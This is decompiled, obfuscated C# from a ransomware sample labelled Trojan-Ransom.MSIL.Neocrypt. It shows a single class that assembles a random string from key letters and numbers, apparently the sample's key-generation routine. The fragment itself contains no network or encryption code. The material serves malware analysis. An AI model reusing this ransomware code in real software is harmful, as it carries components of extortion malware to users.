// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=679946a7cf437fcb
// MVID: 86897229-7BC6-4141-B9B1-66C325C24A9D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Neocrypt.d-9ac5e14466821854f24f31402e9e3cdf97e476fcd0edf111aab0d7189ab5e577.exe

using System;
using System.Text;

namespace \u0003
{
  internal class \u0004
  {
    private string \u0001;
    private string \u0002;
    private int \u0001;
    private char[] \u0001;
    private char[] \u0002;

    protected internal string KeyLetters
    {
      set => this.\u0001 = value;
    }

    protected internal string KeyNumbers
    {
      set => this.\u0002 = value;
    }

    protected internal int KeyChars
    {
      set => this.\u0001 = value;
    }

    public unsafe string \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr1 = (void*) __untypedstackalloc(14);
      StringBuilder stringBuilder1 = new StringBuilder();
      do
      {
        this.\u0001 = \u001D\u0002.\u007E\u0095\u0003((object) this.\u0001);
        this.\u0002 = \u001D\u0002.\u007E\u0095\u0003((object) this.\u0002);
      }
      while (false);
      void* voidPtr2 = voidPtr1;
      *(int*) ((IntPtr) voidPtr1 + 8) = this.\u0001;
      *(int*) voidPtr2 = 1;
      while (*(int*) voidPtr1 <= *(int*) ((IntPtr) voidPtr1 + 8))
      {
        \u008E.\u009A\u0002();
        *(float*) ((IntPtr) voidPtr1 + 4) = \u001E\u0002.\u0096\u0003();
        *(short*) ((IntPtr) voidPtr1 + 12) = (short) -1;
        if (checked ((int) \u001F\u0002.\u0097\u0003((double) unchecked (*(float*) ((IntPtr) voidPtr1 + 4) * 111f))) % 2 == 0)
        {
          while (*(short*) ((IntPtr) voidPtr1 + 12) < (short) 0)
            *(short*) ((IntPtr) voidPtr1 + 12) = \u0080\u0002.\u0099\u0003((float) \u007F\u0002.\u007E\u0098\u0003((object) this.\u0001, 0) * *(float*) ((IntPtr) voidPtr1 + 4));
          string str1 = \u0081\u0002.\u009A\u0003(this.\u0001[(int) *(short*) ((IntPtr) voidPtr1 + 12)]);
          if (checked ((int) \u001F\u0002.\u0097\u0003(unchecked ((double) *(short*) ((IntPtr) voidPtr1 + 12) * (double) *(float*) ((IntPtr) voidPtr1 + 4) * 99.0))) % 2 != 0)
          {
            string str2 = this.\u0001[(int) *(short*) ((IntPtr) voidPtr1 + 12)].ToString();
            str1 = \u0011.\u007E\u0097((object) str2);
          }
          StringBuilder stringBuilder2 = \u0082\u0002.\u007E\u009B\u0003((object) stringBuilder1, str1);
        }
        else
        {
          while (*(short*) ((IntPtr) voidPtr1 + 12) < (short) 0)
            *(short*) ((IntPtr) voidPtr1 + 12) = \u0080\u0002.\u0099\u0003((float) \u007F\u0002.\u007E\u0098\u0003((object) this.\u0002, 0) * *(float*) ((IntPtr) voidPtr1 + 4));
          StringBuilder stringBuilder3 = \u0083\u0002.\u007E\u009C\u0003((object) stringBuilder1, this.\u0002[(int) *(short*) ((IntPtr) voidPtr1 + 12)]);
        }
        *(int*) voidPtr1 = checked (*(int*) voidPtr1 + 1);
      }
      return \u0011.\u007E\u0098((object) stringBuilder1);
    }
  }
}
